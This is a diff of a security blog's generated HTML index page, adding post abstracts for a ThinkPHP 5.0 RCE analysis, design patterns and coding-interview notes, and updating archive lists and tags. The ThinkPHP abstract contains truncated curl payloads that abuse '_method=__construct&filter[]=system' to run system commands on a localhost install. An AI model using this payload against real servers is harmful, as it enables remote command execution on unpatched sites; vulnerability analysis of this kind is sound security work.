@@ -392,6 +392,82 @@ https://github.com/wofeiwo...
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/8880/">
+            
+                <span>Thinkphp5.0.*之RCE漏洞分析</span>
+        </a>
+        <div class="abstract-content">
+            payload:
+1234567891011121314需要开启debug版本:payload1:第一次执行system:curl -v -d &quot;_method=__construct&amp;filter[]=system&quot; &quot;http://localhost/think/public/index.php?a=dir&quot;payload2:第二次执行system:curl -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/12</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/41682/">
+            
+                <span>设计模式</span>
+        </a>
+        <div class="abstract-content">
+            
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/09</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/53933/">
+            
+                <span>剑指ofer</span>
+        </a>
+        <div class="abstract-content">
+            T： 时间复杂度                  S：空间复杂度n个数，大小0-(n-1)，判断是否有重复条件: 无
+方法一: 排序，扫描即可        O(nlogn)
+方法二: 使用HashTable         O(n)
+方法三: 扫描下标为i的数字m时，判断m== i, 是，继续扫描，否，将m和下标为m的数字n进行比较,若相等，则重复，否则交换下标为m和下标为i的两个数字。
+T: O(n)
+S: O(1)
+123456789101112131415161718192021222324252627282930bool duplicate(int numbers[], in...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/09</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/56986/">
             
                 <span>35c3ctf</span>
@@ -558,102 +634,10 @@ prepare
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/11772/">
-            
-                <span>hxp-ctf</span>
-        </a>
-        <div class="abstract-content">
-            Webunpacker123456789101112131415161718192021&lt;?phpif (isset($_FILES[&apos;zip&apos;]) &amp;&amp; $_FILES[&apos;zip&apos;][&apos;size&apos;] &lt; 10*1024 )&#123;    $d = &apos;files/&apos; . bin2hex(random_bytes(32));    mkdir($d) || die(&apos;mkdir&apos;);    chdir($d) || die(&apos;chdir&apos;)...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/10</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/31116/">
-            
-                <span>ctf题目-php调试分析</span>
-        </a>
-        <div class="abstract-content">
-            小菜，加油php流处理的bug案例: realwordctf-one_line_php_challenge
-参考链接: https://hackmd.io/s/rJlfZva0m#exp
-ubuntu18.04 复现一直失败，payload打过去之后，即便已经造成segmentfault,上传文件依然保留不下来。我是很懵逼啊. 比赛给的dockerfile，到目前为止也没有运行成功。。。。。。。。。。。。。。。。。。
-先不考虑ubuntu18.04, 直接在ubuntu16.04上调试。
-payload1:
-1file(urldecode(&apos;php://filter/conve...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/05</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf_php_debug">ctf_php_debug</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/36891/">
-            
-                <span>php7.2内核调试环境搭建</span>
-        </a>
-        <div class="abstract-content">
-            工具
-PHP7.2.12
-gdb
-pwndbg
-clion
-
-php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrortar -zxvf php-7.2.12.tar.gz# php安装基本步骤比较简单，关键是configure的配置选项./configure --prefix=/usr/local/php7/php7.2 --enable-debug --enable-fpmmake &amp;&amp; make installcd /usr/binsudo ln -s /usr/local...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/05</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="php">php</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">NEXT &#62;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -2068,9 +2052,22 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 78
+        Total : 81
         </div>
         <!-- search  -->
         
@@ -2087,6 +2084,30 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
     
         <li class="archive-post-item">
             <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span><a class="archive-post-title" href="/posts/8880/">Thinkphp5.0.*之RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
         </li>
     
     
@@ -2200,12 +2221,12 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
         </li>
     
     
@@ -2230,7 +2251,7 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-深入拆解java虚拟机</a>
         </li>
     
     
@@ -2380,12 +2401,12 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
         </li>
     
     
@@ -2488,19 +2509,19 @@ php安装12345678wget http://hk1.php.net/get/php-7.2.12.tar.gz/from/this/mirrort
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
     
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
-        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
-    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
